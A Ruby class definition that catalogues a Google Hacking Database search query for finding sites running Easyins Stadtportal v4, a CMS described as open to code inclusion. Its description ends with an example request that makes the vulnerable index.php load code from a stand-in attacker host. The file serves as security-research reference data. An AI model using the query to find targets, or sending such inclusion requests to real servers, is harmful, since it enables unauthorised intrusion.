module Dorks
   class Dork388 < Vulpes::Dork

      def initialize
         super({
            name: "Dork 388",
            ghdb_url: "https://www.exploit-db.com/ghdb/388",
            severity: "4",
            category: "vulnerable_servers",
            publish_date: "2004-07-29",
            author: "anonymous",
            dork: <<~EDORK,
allinurl:"index.php" "site=sglinks"
EDORK
            description: <<~EDESC
Easyins Stadtportal v4 is a German Content Management System for cities and regions. Version 4 and prior seems to be vulnerable to a code inclusion in index.php. Bugtraq: http://www.securityfocus.com/bid/10795http://www.host-vulnerable.com/stadtportal-path/index.php?site=http://www.evil-host.com
EDESC
         })

      end
   end
end
